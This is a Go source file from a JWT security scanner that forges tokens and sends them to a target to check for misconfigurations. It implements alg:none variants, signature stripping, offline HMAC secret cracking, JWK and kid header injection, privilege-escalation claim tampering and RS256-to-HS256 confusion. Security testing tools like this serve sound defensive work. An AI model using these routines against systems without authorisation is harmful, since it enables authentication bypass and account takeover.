package jwtscan

import (
	"crypto/hmac"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/sha512"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"github.com/Indigo6415/Aperture/internal/netgov"
	"hash"
	"io"
	"net/http"
	"strings"
	"sync"
	"time"
)

// invalidBaselineToken is a syntactically valid but never-signable JWT used
// to establish the "definitely unauthenticated" baseline response --
// identical to the one JWTear's CLI probes with.
const invalidBaselineToken = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJpbnZhbGlkIn0.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

// probeTimeout bounds a single request against the target. Kept short (as
// in the original CLI) since every test is one more round-trip and a scan
// can run dozens to thousands of them.
const probeTimeout = 5 * time.Second

// newHTTPClient builds the client every probe reuses: TLS verification is
// disabled (this tool routinely targets self-signed lab/CTF boxes) and
// redirects are never followed, since a 3xx is itself a meaningful signal
// (a rejected token often gets redirected to a login page, not just 401'd).
// Proxy is left unset from the environment for the same reason the original
// CLI's requests.Session sets trust_env=False: consistent, un-intercepted
// behavior regardless of the host machine's proxy configuration.
func newHTTPClient() *http.Client {
	return netgov.NewClient(probeTimeout, false)
}

// probeResult is the trimmed-down shape every test cares about: enough to
// run the same status+length heuristic JWTear's CLI uses, without holding
// the full response body in memory for the scan's duration.
type probeResult struct {
	StatusCode int
	Length     int
	// Body is kept for identity checks: whether a forged token was accepted is
	// judged by whether the account named in the real token shows up.
	Body []byte
}

// probe sends token to targetURL via method, carrying it in a cookie named
// cookie if given, else as an Authorization: Bearer header, plus any
// extraHeaders.
func probe(client *http.Client, targetURL, token, method, cookie string, extraHeaders map[string]string) (*probeResult, error) {
	req, err := http.NewRequest(strings.ToUpper(method), targetURL, nil)
	if err != nil {
		return nil, err
	}
	// Caller headers go through netgov so a Host override is honored; a plain
	// Header.Set would drop it silently.
	netgov.ApplyHeaders(req, extraHeaders)
	if cookie != "" {
		req.AddCookie(&http.Cookie{Name: cookie, Value: token})
	} else {
		req.Header.Set("Authorization", "Bearer "+token)
	}

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(io.LimitReader(resp.Body, 10<<20))
	if err != nil {
		return nil, err
	}
	return &probeResult{StatusCode: resp.StatusCode, Length: len(body), Body: body}, nil
}

// identityClaims are payload claims that name the account a token belongs to.
// A forged token that the server accepts gets the same account back, so an
// identity value that appears for the real token and not for an invalid one is
// the strongest acceptance signal available.
var identityClaims = []string{"sub", "email", "username", "preferred_username", "user_id", "uid", "name", "login", "upn", "unique_name"}

// identityMarkers returns the identity values from a token payload that are
// long enough to be distinctive, lowercased for case-insensitive matching.
func identityMarkers(payload map[string]any) []string {
	var out []string
	for _, k := range identityClaims {
		v, ok := payload[k]
		if !ok {
			continue
		}
		s := strings.ToLower(strings.TrimSpace(fmt.Sprint(v)))
		if len(s) >= 3 {
			out = append(out, s)
		}
	}
	return out
}

// presentIn keeps the markers that occur in body. A marker the valid response
// does not show can't tell an accepted token from a rejected one.
func presentIn(body []byte, markers []string) []string {
	lower := strings.ToLower(string(body))
	var out []string
	for _, m := range markers {
		if containsWord(lower, m) {
			out = append(out, m)
		}
	}
	return out
}

// containsWord reports whether needle occurs in haystack with a non-alphanumeric
// character (or the text edge) on both sides. A plain substring match let a short
// name like "ann" hit inside "announcement" on an unrelated page, which is how an
// innocent page could look like it had accepted a forged identity.
func containsWord(haystack, needle string) bool {
	if needle == "" {
		return false
	}
	// Search forward one match at a time, checking each match's edges.
	for start := 0; start < len(haystack); {
		i := strings.Index(haystack[start:], needle)
		if i < 0 {
			return false
		}
		i += start
		end := i + len(needle)
		if isWordEdge(haystack, i-1) && isWordEdge(haystack, end) {
			return true
		}
		start = i + 1
	}
	return false
}

// isWordEdge reports whether the byte at idx is outside a word: the text edge,
// or a byte that is not an ASCII letter or digit. Multi-byte UTF-8 is treated as
// a word character, which errs toward not matching.
func isWordEdge(s string, idx int) bool {
	if idx < 0 || idx >= len(s) {
		return true
	}
	c := s[idx]
	isAlnum := (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c >= 0x80
	return !isAlnum
}

// bodyHasMarker reports whether body contains any of markers.
func bodyHasMarker(body []byte, markers []string) bool {
	return len(presentIn(body, markers)) > 0
}

// TestStatus is the outcome of one misconfiguration check.
type TestStatus string

const (
	StatusVulnerable TestStatus = "vulnerable"
	StatusSafe       TestStatus = "safe"
	StatusSkipped    TestStatus = "skipped"
)

// Attempt is one forged token tried during a test -- kept for tests that
// try a handful of named variants (alg:none casing, kid payloads, claim
// patches) so the UI can show exactly which variant did or didn't land.
// Omitted for the weak-secret brute-force, whose attempt count can run into
// the thousands.
type Attempt struct {
	Label      string `json:"label"`
	Token      string `json:"token"`
	HTTPStatus int    `json:"httpStatus,omitempty"`
	Hit        bool   `json:"hit"`
	Error      string `json:"error,omitempty"`
}

// TestResult is one misconfiguration check's outcome, shaped for direct
// rendering as a pass/fail card in the UI.
type TestResult struct {
	ID       string     `json:"id"`
	Name     string     `json:"name"`
	Status   TestStatus `json:"status"`
	Summary  string     `json:"summary"`
	Token    string     `json:"token,omitempty"` // the forged token that worked, if vulnerable
	Attempts []Attempt  `json:"attempts,omitempty"`
}

// scanCtx carries everything a single test needs: the target + auth
// transport details, the parsed source token, and the two baseline
// responses every hit is judged against.
type scanCtx struct {
	client  *http.Client
	url     string
	method  string
	cookie  string
	headers map[string]string
	header  map[string]any
	payload map[string]any
	ok      *probeResult
	fail    *probeResult
	// markers are identity values present in the valid response (see
	// identityMarkers). rawToken is the source token, used for offline HMAC.
	markers  []string
	rawToken string
}

func (c *scanCtx) probeToken(token string) (*probeResult, error) {
	return probe(c.client, c.url, token, c.method, c.cookie, c.headers)
}

func (c *scanCtx) hit(resp *probeResult) bool {
	return c.hitWith(resp, c.markers)
}

// hitWith judges a response against the given identity markers: the status must
// match the valid baseline, a marker must appear in the response, and none may
// appear in the invalid baseline. With no markers nothing can be judged.
func (c *scanCtx) hitWith(resp *probeResult, markers []string) bool {
	if len(markers) == 0 || resp.StatusCode != c.ok.StatusCode {
		return false
	}
	return bodyHasMarker(resp.Body, markers) && !bodyHasMarker(c.fail.Body, markers)
}

// attemptWithClaims is attempt for a forged token whose claims were changed.
// An accepting server may answer with the changed identity (sub → admin), so
// the patched payload's identity values count as markers alongside the
// original ones.
func (c *scanCtx) attemptWithClaims(label, token string, claims map[string]any) Attempt {
	resp, err := c.probeToken(token)
	if err != nil {
		return Attempt{Label: label, Token: token, Error: err.Error()}
	}
	markers := append(append([]string{}, c.markers...), identityMarkers(claims)...)
	return Attempt{Label: label, Token: token, HTTPStatus: resp.StatusCode, Hit: c.hitWith(resp, markers)}
}

// attempt runs one forged token against the target and records it,
// tolerating a request failure (network error, timeout) as a non-hit
// rather than aborting the whole test.
func (c *scanCtx) attempt(label, token string) Attempt {
	resp, err := c.probeToken(token)
	if err != nil {
		return Attempt{Label: label, Token: token, Error: err.Error()}
	}
	return Attempt{Label: label, Token: token, HTTPStatus: resp.StatusCode, Hit: c.hit(resp)}
}

// testAlgNone tries every casing variant of alg:"none" -- some JWT
// libraries only special-case the exact lowercase string, so mixed case can
// smuggle an unsigned token past a naive check.
func (c *scanCtx) testAlgNone() TestResult {
	res := TestResult{ID: "alg_none", Name: "alg:none Attack"}
	for _, v := range algNoneVariants() {
		h := cloneMap(c.header)
		// An omitted alg drops the key entirely; buildJWT then treats the token
		// as unsigned, the way a library with no alg check would.
		if v.omit {
			delete(h, "alg")
		} else {
			h["alg"] = v.alg
		}
		token, err := buildJWT(h, c.payload, nil)
		if err != nil {
			continue
		}
		a := c.attempt(v.label(), token)
		res.Attempts = append(res.Attempts, a)
		if a.Hit {
			res.Status = StatusVulnerable
			res.Summary = fmt.Sprintf("Server accepted an unsigned token with %s", v.label())
			res.Token = token
			return res
		}
	}
	res.Status = StatusSafe
	res.Summary = fmt.Sprintf("Server rejected all %d alg:none variants (every casing of \"none\", empty alg, omitted alg)", len(algNoneVariants()))
	return res
}

// algNoneVariant is one way of declaring an unsigned token's algorithm. omit
// drops the alg field entirely instead of setting it to alg.
type algNoneVariant struct {
	alg  string
	omit bool
}

// label is how the variant is shown in results.
func (v algNoneVariant) label() string {
	if v.omit {
		return "alg omitted"
	}
	return fmt.Sprintf("alg: %q", v.alg)
}

// algNoneVariants lists every casing of "none" (2^4 = 16 variants: a library
// that lowercases before comparing accepts them all, and one that compares
// exactly accepts only one), plus an empty alg and an omitted alg. The old
// list of four casings missed most of the space that case-tricking actually
// reaches.
func algNoneVariants() []algNoneVariant {
	base := "none"
	out := make([]algNoneVariant, 0, 18)
	// Each bit of the mask chooses upper or lower case for one letter of "none".
	for mask := 0; mask < 1<<len(base); mask++ {
		b := []byte(base)
		for i := range b {
			if mask&(1<<i) != 0 {
				b[i] -= 'a' - 'A'
			}
		}
		out = append(out, algNoneVariant{alg: string(b)})
	}
	out = append(out, algNoneVariant{alg: ""}, algNoneVariant{omit: true})
	return out
}

// testEmptySig strips the signature segment entirely while keeping the
// original header/payload and algorithm claim untouched.
func (c *scanCtx) testEmptySig() TestResult {
	res := TestResult{ID: "empty_sig", Name: "Empty Signature"}
	hBytes, _ := json.Marshal(c.header)
	pBytes, _ := json.Marshal(c.payload)
	signingInput := b64enc(hBytes) + "." + b64enc(pBytes)

	// Two shapes of "no signature": the trailing dot kept (header.payload.) and
	// the segment removed entirely (header.payload). Parsers differ on which
	// they accept, so both are tried.
	variants := []struct{ label, token string }{
		{"signature segment empty (trailing dot)", signingInput + "."},
		{"signature segment omitted (two segments)", signingInput},
	}
	for _, v := range variants {
		a := c.attempt(v.label, v.token)
		res.Attempts = append(res.Attempts, a)
		if a.Hit {
			res.Status = StatusVulnerable
			res.Summary = fmt.Sprintf("Server accepted the token with its signature removed (%s)", v.label)
			res.Token = v.token
			return res
		}
	}
	res.Status = StatusSafe
	res.Summary = "Server rejected the token once its signature was removed"
	return res
}

// hmacHash returns the hash for an HMAC JWS algorithm, or false for anything
// that is not HMAC-based.
func hmacHash(alg string) (func() hash.Hash, bool) {
	switch strings.ToUpper(alg) {
	case "HS256":
		return sha256.New, true
	case "HS384":
		return sha512.New384, true
	case "HS512":
		return sha512.New, true
	}
	return nil, false
}

// testWeakSecret recovers the HMAC secret of the source token by checking each
// candidate offline. An HMAC can be verified locally: compute the MAC of the
// signing input with the candidate and compare it to the token's signature. A
// match proves the secret signed this token, and it costs no requests to the
// target. Earlier versions sent one request per candidate, which was slow,
// noisy, and easy to block, and treated server acceptance as the crack.
func (c *scanCtx) testWeakSecret(secrets []string) (TestResult, *string) {
	res := TestResult{ID: "weak_secret", Name: "Weak HMAC Secret Brute-Force"}
	alg, _ := c.header["alg"].(string)
	newHash, ok := hmacHash(alg)
	if !ok {
		res.Status = StatusSkipped
		res.Summary = fmt.Sprintf("alg=%q is not HMAC-based -- skipping", alg)
		return res, nil
	}

	parts := strings.Split(c.rawToken, ".")
	if len(parts) != 3 {
		res.Status = StatusSkipped
		res.Summary = "source token is not a three-part JWS -- skipping"
		return res, nil
	}
	signingInput := parts[0] + "." + parts[1]
	sig, err := base64.RawURLEncoding.DecodeString(parts[2])
	if err != nil {
		res.Status = StatusSkipped
		res.Summary = "source token signature is not valid base64url -- skipping"
		return res, nil
	}

	for i := range secrets {
		secret := secrets[i]
		mac := hmac.New(newHash, []byte(secret))
		mac.Write([]byte(signingInput))
		if hmac.Equal(mac.Sum(nil), sig) {
			res.Status = StatusVulnerable
			res.Summary = fmt.Sprintf("Recovered the HMAC secret offline: %q signs this token (checked locally, no requests to the target)", secret)
			return res, &secret
		}
	}
	res.Status = StatusSafe
	res.Summary = fmt.Sprintf("None of %d candidate secret(s) signs this token", len(secrets))
	return res, nil
}

// offlineAdvisories reports token properties visible without contacting the
// target: an unsigned algorithm, no expiry, an excessive lifetime, and header
// fields that make the server fetch keys from elsewhere.
func offlineAdvisories(header, payload map[string]any) []string {
	var out []string
	if alg, _ := header["alg"].(string); strings.EqualFold(alg, "none") {
		out = append(out, "Token declares alg \"none\": it carries no signature at all.")
	}
	exp, hasExp := payload["exp"]
	if !hasExp {
		out = append(out, "Token has no exp claim, so it never expires on its own.")
	} else {
		// exp is present. Report whether it has already passed, and whether the
		// token's lifetime (exp minus iat) is longer than a year.
		if expN, ok := asUnix(exp); ok && expN < time.Now().Unix() {
			// Already past its expiry: if the server still accepts it, see testExpiredToken.
			out = append(out, "Token is already expired (exp is in the past).")
		}
		if iat, ok := payload["iat"]; ok {
			expN, okE := asUnix(exp)
			iatN, okI := asUnix(iat)
			if okE && okI && expN-iatN > 365*24*3600 {
				out = append(out, "Token lifetime exceeds one year (exp minus iat).")
			}
		}
	}
	for _, k := range []string{"jku", "x5u"} {
		if _, ok := header[k]; ok {
			out = append(out, fmt.Sprintf("Header carries %q: the server may fetch its verification key from a URL the client chooses.", k))
		}
	}
	if _, ok := header["kid"]; ok {
		out = append(out, "Header carries \"kid\": a client-controlled key identifier is a common injection point.")
	}
	return out
}

// asUnix converts a numeric claim to whole seconds. JSON decoding yields float64,
// but payloads built in code may carry integers, so every numeric type is accepted.
func asUnix(v any) (int64, bool) {
	switch n := v.(type) {
	case float64:
		return int64(n), true
	case int:
		return int64(n), true
	case int64:
		return n, true
	}
	return 0, false
}

// rsaKeypair is generated once, lazily, and reused by every JWK-injection
// test on this server -- mirroring JWTear's CLI generating it once at
// import time rather than paying 2048-bit keygen cost on every scan.
var (
	rsaKeypairOnce sync.Once
	rsaKeypair     *rsa.PrivateKey
	rsaKeypairErr  error
)

func getRSAKeypair() (*rsa.PrivateKey, error) {
	rsaKeypairOnce.Do(func() {
		rsaKeypair, rsaKeypairErr = generateRSAKeypair()
	})
	return rsaKeypair, rsaKeypairErr
}

// testJWKInjection embeds an attacker-generated RSA public key directly in
// the forged token's header ("jwk") and signs with the matching private
// key. A server that resolves the verification key from the token's own
// header, instead of trusting only its own configured keys, will accept it.
func (c *scanCtx) testJWKInjection() TestResult {
	res := TestResult{ID: "jwk_injection", Name: "JWK Header Injection"}

	priv, err := getRSAKeypair()
	if err != nil {
		res.Status = StatusSkipped
		res.Summary = "Could not generate an RSA key pair: " + err.Error()
		return res
	}

	h := map[string]any{}
	for k, v := range c.header {
		if k == "kid" || k == "jku" || k == "x5u" || k == "x5c" {
			continue
		}
		h[k] = v
	}
	h["alg"] = "RS256"
	h["jwk"] = jwkFromPublicKey(&priv.PublicKey)

	token, err := buildJWTRSA(h, c.payload, priv)
	if err != nil {
		res.Status = StatusSkipped
		res.Summary = "Could not sign forged token: " + err.Error()
		return res
	}

	a := c.attempt("RS256 signed with an embedded attacker key", token)
	res.Attempts = []Attempt{a}
	if a.Hit {
		res.Status = StatusVulnerable
		res.Summary = "Server accepted an attacker-embedded RSA public key via the jwk header"
		res.Token = token
	} else {
		res.Status = StatusSafe
		res.Summary = "Server rejected the embedded-JWK token"
	}
	return res
}

// testKidInjection tries kid header values shaped to make a naive
// "read a key file/DB row named by kid" implementation resolve to a
// predictable (often empty or attacker-known) secret -- path traversal to
// well-known files, SQL injection, and a null byte.
func (c *scanCtx) testKidInjection() TestResult {
	res := TestResult{ID: "kid_injection", Name: "kid Header Injection"}
	baseAlg, _ := c.header["alg"].(string)
	useAlg := baseAlg
	if !strings.HasPrefix(strings.ToUpper(baseAlg), "HS") {
		useAlg = "HS256"
	}

	for _, kp := range kidPayloads {
		h := cloneMap(c.header)
		h["alg"] = useAlg
		h["kid"] = kp.Kid
		token, err := buildJWT(h, c.payload, kp.Secret)
		if err != nil {
			continue
		}
		a := c.attempt(fmt.Sprintf("%s (kid=%q, secret=%q)", kp.Name, kp.Kid, kp.Secret), token)
		res.Attempts = append(res.Attempts, a)
		if a.Hit {
			res.Status = StatusVulnerable
			res.Summary = fmt.Sprintf("Server accepted kid=%q signed with secret %q (%s)", kp.Kid, kp.Secret, kp.Name)
			res.Token = token
			return res
		}
	}
	res.Status = StatusSafe
	res.Summary = "Server rejected every kid-injection payload"
	return res
}

// testClaimTampering tries a battery of privilege-escalation claim
// overrides, first unsigned (alg:none) and -- if the weak-secret test
// already cracked the HMAC secret -- again properly re-signed with it. The
// re-signed variant catches a server that correctly rejects alg:none but
// would still trust a completely valid signature over tampered claims.
func (c *scanCtx) testClaimTampering(foundSecret *string) TestResult {
	res := TestResult{ID: "claim_tampering", Name: "Claim Tampering"}
	alg, _ := c.header["alg"].(string)
	var found bool

	for _, cp := range claimPatches {
		p := cloneMap(c.payload)
		for k, v := range cp.Patch {
			p[k] = v
		}

		hNone := cloneMap(c.header)
		hNone["alg"] = "none"
		token, err := buildJWT(hNone, p, nil)
		if err == nil {
			a := c.attemptWithClaims(cp.Desc+" (alg:none)", token, p)
			res.Attempts = append(res.Attempts, a)
			if a.Hit {
				found = true
				if res.Token == "" {
					res.Token = token
				}
			}
		}

		if foundSecret != nil && strings.HasPrefix(strings.ToUpper(alg), "HS") {
			token, err := buildJWT(c.header, p, []byte(*foundSecret))
			if err == nil {
				a := c.attemptWithClaims(cp.Desc+" (re-signed with cracked secret)", token, p)
				res.Attempts = append(res.Attempts, a)
				if a.Hit {
					found = true
					if res.Token == "" {
						res.Token = token
					}
				}
			}
		}
	}

	if found {
		res.Status = StatusVulnerable
		res.Summary = "At least one privilege-escalation claim override was accepted"
	} else {
		res.Status = StatusSafe
		res.Summary = "No privilege-escalation claim override was accepted"
	}
	return res
}

// expiryGrace is how far past its exp a token must be before it counts as
// expired. Servers allow a few minutes of clock skew, so a token that lapsed a
// moment ago proves nothing about expiry enforcement.
const expiryGrace = 5 * time.Minute

// expiredTokenBackdate is how far in the past the forged token's exp is set when
// the expiry test re-signs claims. A day is far outside any leeway.
const expiredTokenBackdate = 24 * time.Hour

// testExpiredToken checks whether the target enforces the exp claim, in one of
// two ways, and skips when neither is possible:
//  1. The caller's own token is already past exp (by more than expiryGrace), and
//     the valid response still shows the account. That response is the server
//     accepting an expired token, so no forging is needed.
//  2. The HMAC secret was recovered (foundSecret), so the same claims can be
//     re-signed with exp a day in the past. An accepted response means expiry
//     is not enforced even though the signature is valid.
func (c *scanCtx) testExpiredToken(foundSecret *string) TestResult {
	res := TestResult{ID: "expired_token", Name: "Expired Token Acceptance"}
	now := time.Now().Unix()

	// Case 1: the source token itself has lapsed and was still accepted. The
	// baseline's identity markers are what show the account was served.
	if exp, ok := asUnix(c.payload["exp"]); ok && exp < now-int64(expiryGrace.Seconds()) && len(c.markers) > 0 {
		res.Attempts = []Attempt{{
			Label: "source token (exp in the past)", Token: c.rawToken,
			HTTPStatus: c.ok.StatusCode, Hit: true,
		}}
		res.Status = StatusVulnerable
		res.Summary = "Server accepted the caller's own token after its exp claim had passed"
		res.Token = c.rawToken
		return res
	}

	// Case 2: re-sign the same claims with exp in the past. This needs the
	// secret, so it only runs when the weak-secret test recovered one.
	if foundSecret != nil && strings.HasPrefix(strings.ToUpper(fmt.Sprint(c.header["alg"])), "HS") {
		p := cloneMap(c.payload)
		p["exp"] = now - int64(expiredTokenBackdate.Seconds())
		if token, err := buildJWT(c.header, p, []byte(*foundSecret)); err == nil {
			a := c.attemptWithClaims("re-signed with exp one day in the past", token, p)
			res.Attempts = []Attempt{a}
			if a.Hit {
				res.Status = StatusVulnerable
				res.Summary = "Server accepted a validly signed token whose exp claim was one day in the past"
				res.Token = token
				return res
			}
			res.Status = StatusSafe
			res.Summary = "Server rejected a validly signed token whose exp claim was one day in the past"
			return res
		}
	}

	// Neither case can run: no expiry to test, or no way to forge the claim.
	res.Status = StatusSkipped
	if _, hasExp := c.payload["exp"]; !hasExp {
		res.Summary = "Token has no exp claim, so there is no expiry to enforce -- skipping"
	} else {
		res.Summary = "Expiry enforcement needs either an already-expired token or a recovered HMAC secret -- skipping"
	}
	return res
}

// testRS256HS256 tries the classic algorithm-confusion attack: sign an
// HS256 token using the server's own RSA public key bytes as the HMAC
// secret. A server that verifies "whatever alg the token claims" using the
// same public key object for both RS256 and HS256 will treat the public key
// as a shared secret it never intended to be one.
//
// manualPEM, if given, is used verbatim and takes priority over discovery.
// Otherwise every auto-discovered candidate (see discoverPublicKeyPEM) is
// tried in turn -- there's rarely more than one or two, since discovery
// stops at the first source that yields a key.
func (c *scanCtx) testRS256HS256(manualPEM string, discovered []pemCandidate) TestResult {
	res := TestResult{ID: "rs256_hs256_confusion", Name: "RS256 → HS256 Algorithm Confusion"}

	candidates := discovered
	if strings.TrimSpace(manualPEM) != "" {
		candidates = []pemCandidate{{PEM: manualPEM, Source: "manually provided"}}
	}
	if len(candidates) == 0 {
		res.Status = StatusSkipped
		res.Summary = "No RS256 public key was provided, and none could be auto-discovered from the target -- paste one manually to enable this test"
		return res
	}

	// Each candidate key is tried under every HMAC width. A verifier that
	// accepts "any HS*" with the public key as the secret fails on HS384 or
	// HS512 even when a HS256-only probe was rejected.
	for _, cand := range candidates {
		for _, alg := range []string{"HS256", "HS384", "HS512"} {
			h := cloneMap(c.header)
			h["alg"] = alg
			token, err := buildJWT(h, c.payload, []byte(cand.PEM))
			if err != nil {
				continue
			}
			a := c.attempt(fmt.Sprintf("%s signed with public key from %s", alg, cand.Source), token)
			res.Attempts = append(res.Attempts, a)
			if a.Hit {
				res.Status = StatusVulnerable
				res.Summary = fmt.Sprintf("Server accepted its own RSA public key (%s) used as an HMAC secret under %s", cand.Source, alg)
				res.Token = token
				return res
			}
		}
	}

	res.Status = StatusSafe
	if candidates[0].Source == "manually provided" {
		res.Summary = "Server rejected the RS256→HS256 confusion token"
	} else {
		res.Summary = fmt.Sprintf("Auto-discovered a public key (%s) but the server rejected it as an HMAC secret", candidates[0].Source)
	}
	return res
}

// baselineSamples is how many times each reference request is sent. One sample
// cannot show whether the server is stable, and several tests are judged
// against these responses.
const baselineSamples = 3

// sampleBaseline sends the same request baselineSamples times. It returns the
// first response as the baseline and every sampled status, so the caller can
// tell whether the server answers consistently.
func sampleBaseline(client *http.Client, url, token, method, cookie string, headers map[string]string) (*probeResult, []int, error) {
	var first *probeResult
	statuses := make([]int, 0, baselineSamples)
	for i := 0; i < baselineSamples; i++ {
		r, err := probe(client, url, token, method, cookie, headers)
		if err != nil {
			if first == nil {
				return nil, nil, err
			}
			continue
		}
		if first == nil {
			first = r
		}
		statuses = append(statuses, r.StatusCode)
	}
	return first, statuses, nil
}

// allSame reports whether every value in xs is equal.
func allSame(xs []int) bool {
	for _, x := range xs {
		if x != xs[0] {
			return false
		}
	}
	return true
}
